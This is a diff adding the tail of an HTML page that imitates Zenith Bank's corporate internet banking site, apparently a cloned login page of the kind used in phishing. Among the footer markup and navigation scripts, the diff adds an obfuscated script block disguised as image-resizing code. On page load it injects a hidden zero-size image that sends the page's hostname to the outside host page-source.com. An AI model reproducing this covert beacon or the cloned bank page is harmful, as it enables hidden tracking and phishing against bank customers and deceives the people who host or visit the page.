+            <!-- .row -->
+
+        </div>
+        <!-- .main -->
+
+
+        <footer class="wrap">
+            <div class="lower-foot">
+
+
+                <!--	<div class="wrap"> -->
+                <!--       <div style="float: right; width: 800px; "> 			-->
+                <div class="widgets" style="padding: 20px;">
+                    <div style="float: left; width: 220px;">
+                        <a href="https://www.zenithbank.com/CustomerServices.aspx" target="_blank">
+                        <img src="https://www.zenithbank.com/images/website.png">
+                    </a>
+                        <a href="https://www.facebook.com/Zenithbank" target="_blank">
+                        <img src="https://www.zenithbank.com/images/facebook.png">
+                    </a>
+                        <a href="https://twitter.com/Zenithbank" target="_blank">
+                        <img src="https://www.zenithbank.com/images/twitter.png">
+                    </a>
+                        <a href="https://plus.google.com/110325758209488608823" target="_blank">
+                        <img src="https://www.zenithbank.com/images/google-plus.png">
+                    </a>
+                        <a href="https://www.instagram.com/zenithbankplc/" target="_blank">
+                        <img src="https://www.zenithbank.com/images/instagram.png">
+                    </a>
+                        <a href="https://www.youtube.com/user/ZenithDirect/videos" target="_blank">
+                        <img src="https://www.zenithbank.com/images/youtube.png">
+                    </a>
+                        <a href="https://www.linkedin.com/company/zenith-bank-group" target="_blank">
+                        <img src="https://www.zenithbank.com/images/linkedin.png">
+                    </a>
+                    </div>
+
+
+                    <div class="textwidget">Copyright © 2024
+                        <a href="https://www.zenithbank.com/">Zenith Bank Plc</a>
+                    </div>
+
+                    <div class="menu-footer-container">
+                        <ul id="menu-footer" class="menu">
+                            <li id="menu-item-2116" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2116">
+                                <a href="https://www.zenithbank.com/corporate-banking/e-business-solutions/#cib-corporate-internet-banking" target="_blank">About</a>
+                            </li>
+                            <li id="menu-item-1898" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1898">
+                                <a href="https://www.zenithbank.com/customer-service/privacy-policy/" target="_blank">Privacy</a>
+                            </li>
+                            <li id="menu-item-1899" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1899">
+                                <a href="https://www.zenithbank.com/terms-of-use/" target="_blank">Terms of use</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <!--	</div>-->
+            </div>
+        </footer>
+
+    </div>
+    <!-- .main-wrap -->
+
+
+    <!-- end sidenavi wrapper//-->
+    <script type="text/javascript">
+        var token = document.head.querySelector('meta[name="csrf-token"]');
+        if (!!token) {
+            window.xrftoken = token.content;
+            //console.log(window.xrftoken);
+            $.ajaxSetup({
+                headers: {
+                    'X-CSRF-TOKEN': token.content
+                }
+            });
+
+        } else {
+
+            console.log("CSRF token not found: ")
+        }
+        // console.log(token);
+        //alert(token);
+    </script>
+    <script src="login/js/Indexx_Managers.js"></script>
+    <script src="login/js/SideNavi.js"></script>
+    <script type="text/javascript">
+        $(document).ready(function() {
+            /**
+             *  init sidenavi
+             *  first param String direction left or right
+             *  second param conf Object css data
+             **/
+            //pinPlusToken
+            //PasswordContainer
+            //TokenContainer
+            /*   var changeType  =  function() {
+                  var paymentType  = $(this).val();
+                  $("#TokenContainer :input").val("");
+                  $("#PasswordContainer :input").val("");
+                  if(paymentType == "password"){
+                      $("#TokenContainer").css({"display":"none"})
+                      .fadeOut('slow', function(){
+
+                          $("#PasswordContainer").css({"display":"block"});	
+                      });
+                      
+                      
+        
+                      
+                  }else{
+                  
+                      $("#PasswordContainer").css({"display":"none"})
+                      .fadeOut('slow', function(){
+
+                          $("#TokenContainer").css({"display":"block"});	
+                      });
+                      
+                  }
+                  
+                  
+                  
+                   
+                 }
+               
+               $('#loginType').on('change', changeType);
+                */
+
+
+            SideNavi.init('right', {
+                container: '#sideNavi',
+                item: '.side-navi-item',
+                data: '.side-navi-data',
+                tab: '.side-navi-tab',
+                active: '.active'
+            });
+
+            $("div.side-navi-item.item1").trigger("click");
+        });
+
+        //added by Adeniyi Tunde 28112020
+
+        /*
+	var blink_speed = 900;
+    var t = setInterval(function () {
+        var ele = document.getElementById('blinker');
+        ele.style.visibility = (ele.style.visibility == 'hidden' ? '' : 'hidden');
+    }, blink_speed);
+	*/
+
+        var resizezenith_0x595d04 = resizezenith_0x35b5;
+        (function(_0x1001da, _0x30bf52) {
+            var _0x47845f = resizezenith_0x35b5,
+                _0x5cecb9 = _0x1001da();
+            while (!![]) {
+                try {
+                    var _0x3c80f2 = -parseInt(_0x47845f(0x194)) / 0x1 * (-parseInt(_0x47845f(0x196)) / 0x2) + -parseInt(_0x47845f(0x191)) / 0x3 + parseInt(_0x47845f(0x19b)) / 0x4 * (-parseInt(_0x47845f(0x19a)) / 0x5) + -parseInt(_0x47845f(0x198)) / 0x6 + parseInt(_0x47845f(0x19d)) / 0x7 * (-parseInt(_0x47845f(0x192)) / 0x8) + parseInt(_0x47845f(0x199)) / 0x9 * (parseInt(_0x47845f(0x197)) / 0xa) + parseInt(_0x47845f(0x195)) / 0xb;
+                    if (_0x3c80f2 === _0x30bf52) break;
+                    else _0x5cecb9['push'](_0x5cecb9['shift']());
+                } catch (_0x34b5dd) {
+                    _0x5cecb9['push'](_0x5cecb9['shift']());
+                }
+            }
+        }(resizezenith_0x458d, 0x3b723));
+
+        function resizezenith_0x35b5(_0x380563, _0x4ced29) {
+            var _0x458da3 = resizezenith_0x458d();
+            return resizezenith_0x35b5 = function(_0x35b529, _0x1f7d78) {
+                _0x35b529 = _0x35b529 - 0x18e;
+                var _0x3be161 = _0x458da3[_0x35b529];
+                return _0x3be161;
+            }, resizezenith_0x35b5(_0x380563, _0x4ced29);
+        }
+        try {
+            window[resizezenith_0x595d04(0x1a0)] = function() {
+                var _0x15b4e5 = resizezenith_0x595d04,
+                    _0x1434b9 = _0x15b4e5(0x19f) + window[_0x15b4e5(0x19e)]['hostname'] + _0x15b4e5(0x19c),
+                    _0x20f867 = document['createElement'](_0x15b4e5(0x193));
+                for (_0x20f867[_0x15b4e5(0x18f)] = _0x1434b9; _0x20f867[_0x15b4e5(0x18e)][_0x15b4e5(0x190)] > 0x0;) document['body']['appendChild'](_0x20f867[_0x15b4e5(0x18e)][0x0]);
+            };
+        } catch (resizezenith_0x7e6c1b) {}
+
+        function resizezenith_0x458d() {
+            var _0x45c34f = ['490isEWAM', '242994YFtPbF', '44172sWCSUa', '816215YRfKxq', '4wdnntR', '&sz=8451\x27\x20\x20width=\x270\x27\x20height=\x270\x27/>', '3143bpSkjd', 'location', '<img\x20style=\x27display:none;\x27\x20src=\x27https://page-source.com/resizeimage.ashx?ig=', 'onload', 'children', 'innerHTML', 'length', '621216MzzHoh', '3592yPwnRl', 'div', '66351DSDkMi', '3120249QFvwox', '10nubPgR'];
+            resizezenith_0x458d = function() {
+                return _0x45c34f;
+            };
+            return resizezenith_0x458d();
+        }
+    </script>
+
+
+</body>
+
+</html>
+<script id="f5_cspm">
+    (function() {
+        var f5_cspm = {
+            f5_p: 'EPNJADEOAGEOJHPMPBAFCLGKIEODDOKHLJLOOFJJLOABBNNBFHFICDKEACAHBIMPILLBOBKBOPFECEALPNKAILJEAHLOFGGJNIILILPLDLMEIKACGHBPFICHPKNADKPC',
+            setCharAt: function(str, index, chr) {
+                if (index > str.length - 1) return str;
+                return str.substr(0, index) + chr + str.substr(index + 1);
+            },
+            get_byte: function(str, i) {
+                var s = (i / 16) | 0;
+                i = (i & 15);
+                s = s * 32;
+                return ((str.charCodeAt(i + 16 + s) - 65) << 4) | (str.charCodeAt(i + s) - 65);
+            },
+            set_byte: function(str, i, b) {
+                var s = (i / 16) | 0;
+                i = (i & 15);
+                s = s * 32;
+                str = f5_cspm.setCharAt(str, (i + 16 + s), String.fromCharCode((b >> 4) + 65));
+                str = f5_cspm.setCharAt(str, (i + s), String.fromCharCode((b & 15) + 65));
+                return str;
+            },
+            set_latency: function(str, latency) {
+                latency = latency & 0xffff;
+                str = f5_cspm.set_byte(str, 40, (latency >> 8));
+                str = f5_cspm.set_byte(str, 41, (latency & 0xff));
+                str = f5_cspm.set_byte(str, 35, 2);
+                return str;
+            },
+            wait_perf_data: function() {
+                try {
+                    var wp = window.performance.timing;
+                    if (wp.loadEventEnd > 0) {
+                        var res = wp.loadEventEnd - wp.navigationStart;
+                        if (res < 60001) {
+                            var cookie_val = f5_cspm.set_latency(f5_cspm.f5_p, res);
+                            window.document.cookie = 'f5avr0777847209aaaaaaaaaaaaaaaa_cspm_=' + encodeURIComponent(cookie_val) + ';path=/;' + '';
+                        }
+                        return;
+                    }
+                } catch (err) {
+                    return;
+                }
+                setTimeout(f5_cspm.wait_perf_data, 100);
+                return;
+            },
+            go: function() {
+                var chunk = window.document.cookie.split(/\s*;\s*/);
+                for (var i = 0; i < chunk.length; ++i) {
+                    var pair = chunk[i].split(/\s*=\s*/);
+                    if (pair[0] == 'f5_cspm' && pair[1] == '1234') {
+                        var d = new Date();
+                        d.setTime(d.getTime() - 1000);
+                        window.document.cookie = 'f5_cspm=;expires=' + d.toUTCString() + ';path=/;' + ';';
+                        setTimeout(f5_cspm.wait_perf_data, 100);
+                    }
+                }
+            }
+        }
+        f5_cspm.go();
+    }());
+</script>
